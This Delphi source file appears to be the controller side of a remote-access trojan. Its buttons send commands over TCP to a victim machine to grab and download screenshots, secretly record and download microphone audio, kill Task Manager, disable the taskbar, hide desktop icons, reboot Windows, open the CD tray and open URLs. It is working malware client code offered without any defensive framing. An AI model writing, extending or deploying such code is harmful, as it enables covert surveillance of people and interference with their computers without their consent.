unit Unit1;

interface

uses
{$IFDEF WIn32}
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, IdBaseComponent, IdComponent, IdTCPConnection,
  IdTCPClient, IdTCPServer, ExtCtrls, jpeg, Menus, IdAntiFreezeBase,
  IdAntiFreeze;
{$ENDIF}

{$IFDEF Linux}
  QGraphics, QControls, QForms, QDialogs, QStdCtrls,
  QExtCtrls, QComCtrls, QButtons, Types, QTypes,
  Variants,IdIPWatch, IdAntiFreezeBase, IdAntiFreeze,
  IdTCPConnection, IdTCPClient, IdBaseComponent, IdComponent, IdTCPServer,
  QMenus, QT;
 {$ENDIF}


type
  TForm1 = class(TForm)
    IdTCPClient1: TIdTCPClient;
    Button1: TButton;
    Button2: TButton;
    ListBox1: TListBox;
    hostbox: TEdit;
    portbox: TEdit;
    Button3: TButton;
    msgbox: TEdit;
    Button4: TButton;
    Button5: TButton;
    Button6: TButton;
    Button7: TButton;
    Button8: TButton;
    Button9: TButton;
    Button10: TButton;
    Button11: TButton;
    Button12: TButton;
    Timer1: TTimer;
    Button13: TButton;
    MainMenu1: TMainMenu;
    File1: TMenuItem;
    Exit1: TMenuItem;
    Options1: TMenuItem;
    Help1: TMenuItem;
    About1: TMenuItem;
    Button14: TButton;
    Button15: TButton;
    Button16: TButton;
    Button17: TButton;
    Button18: TButton;
    Button19: TButton;
    Button20: TButton;
    Button21: TButton;
    Button22: TButton;
    Support1: TMenuItem;
    Help2: TMenuItem;
    Button23: TButton;
    IdAntiFreeze1: TIdAntiFreeze;
    Button24: TButton;
    OpenDialog1: TOpenDialog;
    IdTCPServer1: TIdTCPServer;
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure IdTCPClient1Connected(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure msgboxKeyPress(Sender: TObject; var Key: Char);
    procedure Button6Click(Sender: TObject);
    procedure Button5Click(Sender: TObject);
    procedure Button7Click(Sender: TObject);
    procedure Button8Click(Sender: TObject);
    procedure Button9Click(Sender: TObject);
    procedure Button10Click(Sender: TObject);
    procedure Button11Click(Sender: TObject);
    procedure Button12Click(Sender: TObject);
    procedure Button13Click(Sender: TObject);
    procedure About1Click(Sender: TObject);
    procedure Exit1Click(Sender: TObject);
    procedure Options1Click(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure Button14Click(Sender: TObject);
    procedure Button15Click(Sender: TObject);
    procedure Button16Click(Sender: TObject);
    procedure Button17Click(Sender: TObject);
    procedure Button18Click(Sender: TObject);
    procedure Button19Click(Sender: TObject);
    procedure Button20Click(Sender: TObject);
    procedure Button21Click(Sender: TObject);
    procedure Button22Click(Sender: TObject);
    procedure Support1Click(Sender: TObject);
    procedure Help2Click(Sender: TObject);
    procedure Button23Click(Sender: TObject);
    procedure Button24Click(Sender: TObject);
    procedure IdTCPClient1Disconnected(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

uses Unit2, Unit3, Unit4;

{$R *.dfm}

procedure TForm1.Button1Click(Sender: TObject);
begin
listbox1.Items.Clear;

with IdTCPClient1 do
    begin
    Host := Hostbox.Text;
    Port := StrToint(Portbox.Text);
      try
      Connect; // add a timeout here if you wish, eg: Connect(3000) = timeout after 3 seconds.
      except
      on E : Exception do
          begin

          ShowMessage(E.Message);
          end;
end;
end;
end;
procedure TForm1.Button2Click(Sender: TObject);
begin
if IdTCPClient1.Connected then
    try
    idtcpclient1.WriteLn('Client Disconnected');
    IdTCPClient1.Disconnect; // we can disconnect from either the server or the client side
    listbox1.Items.Insert(0,'Client Disconnected');
    except on E : Exception do
        ShowMessage(E.Message);
    end;
end;

procedure TForm1.IdTCPClient1Connected(Sender: TObject);
var
    LString : String;
begin
LString := IdTCPClient1.ReadLn;
listbox1.Items.Insert(0,'Connected to remote server');
listbox1.Items.Insert(0,'Server said -> ' + LString);
idtcpserver1.Active:=true;
end;

procedure TForm1.Button3Click(Sender: TObject);
var
    LCommand, LInString : String;
    LInInteger : integer;
begin
LCommand := msgbox.Text;
//LInInteger := -1;

with IdTCPClient1 do
    begin
      try
      WriteLn(LCommand);
      //readln(LInString);
      {if LInInteger <> -1 then
        LInString := IntToStr(LInInteger); }

      listbox1.Items.Insert(0,'We said -> ' + LCommand);
      //listbox1.Items.Insert(0,'Server said -> ' + LInString);

      except
      on E : Exception do
          begin
          ShowMessage(E.Message);
          end;
      end;
    end;

msgbox.Clear;
end;

procedure TForm1.Button4Click(Sender: TObject);
var
Scommand:string;
begin

try
with IdTCPClient1 do
    begin
    WriteLn('CDO');
    //readln(Scommand);
    listbox1.Items.Insert(0,'Open CD Tray');
    end;
except
on E : Exception do
    ShowMessage(E.Message);
end;
end;

procedure TForm1.msgboxKeyPress(Sender: TObject; var Key: Char);
begin
if key=#13 then
begin
button3.Click;
end;
end;

procedure TForm1.Button6Click(Sender: TObject);
begin
listbox1.Clear;

end;

procedure TForm1.Button5Click(Sender: TObject);
var
Scommand:string;
begin

try
with IdTCPClient1 do
    begin
    WriteLn('CDC');
    //readln(Scommand);
    listbox1.Items.Insert(0,'Close CD Tray');
    end;
except
on E : Exception do
    ShowMessage(E.Message);
end;
end;

procedure TForm1.Button7Click(Sender: TObject);
var
Scommand:string;
begin

try
with IdTCPClient1 do
    begin
    WriteLn('MONON');
    //readln(Scommand);
    listbox1.Items.Insert(0,'Monitor ON');
    end;
except
on E : Exception do
    ShowMessage(E.Message);
end;
end;


procedure TForm1.Button8Click(Sender: TObject);
var
Scommand:string;
begin

try
with IdTCPClient1 do
    begin
    WriteLn('MONOFF');
    //readln(Scommand);
    listbox1.Items.Insert(0,'Monitor OFF');
    end;
except
on E : Exception do
    ShowMessage(E.Message);
end;
end;

procedure TForm1.Button9Click(Sender: TObject);
var
Scommand:string;
begin

try
with IdTCPClient1 do
    begin
    WriteLn('REBOOT');
    //readln(Scommand);
    listbox1.Items.Insert(0,'Reboot Windows');
    end;
except
on E : Exception do
    ShowMessage(E.Message);
end;
end;

procedure TForm1.Button10Click(Sender: TObject);
var
Scommand:string;
begin

try
with IdTCPClient1 do
    begin
    WriteLn('KILLTASK');
    //readln(Scommand);
    listbox1.Items.Insert(0,'Kill Taskmgr');
    end;
except
on E : Exception do
    ShowMessage(E.Message);
end;
end;

procedure TForm1.Button11Click(Sender: TObject);
var
Scommand:string;
begin

try
with IdTCPClient1 do
    begin
    WriteLn('STARTTASK');
    //readln(Scommand);
    listbox1.Items.Insert(0,'Start Taskmgr');
    end;
except
on E : Exception do
    ShowMessage(E.Message);
end;
end;

procedure TForm1.Button12Click(Sender: TObject);
var
    ftmpStream : TFileStream;
begin
try
with IdTCPClient1 do
    begin
    WriteLn('SCREEN');
    // delete if exists
    // in production situation you might store binary downloads like this in a cache folder
    if FileExists('ServerScreen.jpg') then
        DeleteFile('ServerScreen.jpg');
    ftmpStream := TFileStream.Create('ServerScreen.jpg',fmCreate);
     while connected do
    ReadStream(fTmpStream,-1,true);
    FreeAndNil(fTmpStream);
    disconnect;
    connect;
    form2.image1.Picture.LoadFromFile(ExtractFileDir(ParamStr(0)) + '\ServerScreen.jpg');
    form2.showmodal;
    //connect;
    //image1.Picture.LoadFromFile(ExtractFileDir(ParamStr(0)) + '\ServerScreen.jpg');
    end;
except
on E : Exception do
    ShowMessage(E.Message);
end;
end;

procedure TForm1.Button13Click(Sender: TObject);
var
Scommand:string;
cmsg:string;
begin
try
with IdTCPClient1 do
    begin
    cmsg:=msgbox.Text;
    WriteLn(cmsg);
    WriteLn('DLGMSG');
    //readln(Scommand);
    listbox1.Items.Insert(0,'Message Sent');
    end;
except
on E : Exception do
    ShowMessage(E.Message);
end;
end;

procedure TForm1.About1Click(Sender: TObject);
begin
//Showmessage('about box goes here, remember to put it here fool!');
//aboutbox.showmodal;
end;

procedure TForm1.Exit1Click(Sender: TObject);
begin
timer1.Enabled:=true;
end;

procedure TForm1.Options1Click(Sender: TObject);
begin
showmessage('gj why dont u try actually program the options now...');
end;

procedure TForm1.Timer1Timer(Sender: TObject);
begin
form1.Width:=form1.Width-1;
form1.Height:=form1.Height-3;
if form1.Height=34 then
begin
form1.close;
end;
end;

procedure TForm1.Button14Click(Sender: TObject);
var
Scommand:string;
begin

try
with IdTCPClient1 do
    begin
    WriteLn('HIDEDESK');
    //readln(Scommand);
    listbox1.Items.Insert(0,'Hide Desktop Shortcuts');
    end;
except
on E : Exception do
    ShowMessage(E.Message);
end;
end;

procedure TForm1.Button15Click(Sender: TObject);
var
Scommand:string;
begin

try
with IdTCPClient1 do
    begin
    WriteLn('SHOWDESK');
    //readln(Scommand);
    listbox1.Items.Insert(0,'Show Desktop Shortcuts');
    end;
except
on E : Exception do
    ShowMessage(E.Message);
end;
end;

procedure TForm1.Button16Click(Sender: TObject);
var
Scommand:string;
begin

try
with IdTCPClient1 do
    begin
    WriteLn('DISABLETASKBAR');
    //readln(Scommand);
    listbox1.Items.Insert(0,'Disable TaskBar');
    end;
except
on E : Exception do
    ShowMessage(E.Message);
end;
end;

procedure TForm1.Button17Click(Sender: TObject);
var
Scommand:string;
begin

try
with IdTCPClient1 do
    begin
    WriteLn('ENABLETASKBAR');
    //readln(Scommand);
    listbox1.Items.Insert(0,'Enable TaskBar');
    end;
except
on E : Exception do
    ShowMessage(E.Message);
end;
end;

procedure TForm1.Button18Click(Sender: TObject);
var
Scommand:string;
begin

try
with IdTCPClient1 do
    begin
    WriteLn('RECORDSOUNDSTART');
    //readln(Scommand);
    listbox1.Items.Insert(0,'Start Record Sound');
    end;
except
on E : Exception do
    ShowMessage(E.Message);
end;
end;

procedure TForm1.Button19Click(Sender: TObject);
var
Scommand:string;
begin

try
with IdTCPClient1 do
    begin
    WriteLn('RECORDSOUNDSTOP');
    //readln(Scommand);
    listbox1.Items.Insert(0,'Stop Record Sound');
    end;
except
on E : Exception do
    ShowMessage(E.Message);
end;
end;

procedure TForm1.Button20Click(Sender: TObject);
var
Scommand:string;
begin

try
with IdTCPClient1 do
    begin
    WriteLn('SAVERECORDEDSOUND');
    //readln(Scommand);
    listbox1.Items.Insert(0,'Save Record Sound');
    end;
except
on E : Exception do
    ShowMessage(E.Message);
end;
end;

procedure TForm1.Button21Click(Sender: TObject);
var
Scommand:string;
begin

try
with IdTCPClient1 do
    begin
    showmessage('disabled for now');
    {WriteLn('SETDESKTOP');
    //readln(Scommand);
    listbox1.Items.Insert(0,'Set Desktop'); }
    end;
except
on E : Exception do
    ShowMessage(E.Message);
end;
end;

procedure TForm1.Button22Click(Sender: TObject);
var
Scommand, URL:string;
begin

try
with IdTCPClient1 do
    begin
    URL:=InputBox('Input A URL', 'URL', 'http://www.google.com');
    WriteLn('BROWSEURL');
    writeln(URL);
    //readln(Scommand);
    listbox1.Items.Insert(0,'Browse URL');
    end;
except
on E : Exception do
    ShowMessage(E.Message);
end;
end;

procedure TForm1.Support1Click(Sender: TObject);
begin
form4.showmodal;
end;

procedure TForm1.Help2Click(Sender: TObject);
begin
showmessage('hah im not wasting my time on helping you!');
end;

procedure TForm1.Button23Click(Sender: TObject);
var
Scommand:string;
ftmpStream : TFileStream;
begin

try
with IdTCPClient1 do
    begin
    WriteLn('DOWNLOADSOUND');
    //readln(Scommand);
    listbox1.Items.Insert(0,'Download Recorded Sound');
    if FileExists('Sound.wav') then
    DeleteFile('Sound.wav');
    ftmpStream := TFileStream.Create('Sound.wav',fmCreate);
    while connected do
        ReadStream(fTmpStream,-1,true);
    FreeAndNil(fTmpStream);
    Disconnect;
    connect;


    end;
except
on E : Exception do
    ShowMessage(E.Message);
end;
end;

procedure TForm1.Button24Click(Sender: TObject);
var
Scommand:string;
ftmpStream, fstream : TFileStream;
begin
try

with IdTCPClient1 do
    begin
    //readln(scommand);
    WriteLn('TRACK');
    readln(scommand);
    listbox1.Items.Insert(0,scommand);
    end;
except
on E : Exception do
    ShowMessage(E.Message);
end;

{try
with IdTCPClient1 do
    begin
    WriteLn('UPLOADFILE');
    if opendialog1.Execute then begin
    // open file stream to image requested
        fStream := TFileStream.Create(opendialog1.FileName,fmOpenRead	+ fmShareDenyNone);
        // copy file stream to write stream
        AThread.Connection.OpenWriteBuffer;
        AThread.Connection.WriteStream(fStream);
        AThread.Connection.CloseWriteBuffer;
        // free the file stream
        FreeAndNil(fStream);
        //Athread.Connection.WriteLn('Download Recorded Sound');
        listbox1.Items.Insert(0, 'File Uploaded');
    end;
    end;
except
on E : Exception do
    ShowMessage(E.Message);
end;}
end;

procedure TForm1.IdTCPClient1Disconnected(Sender: TObject);
begin
idtcpserver1.Active:=false;
end;

end.





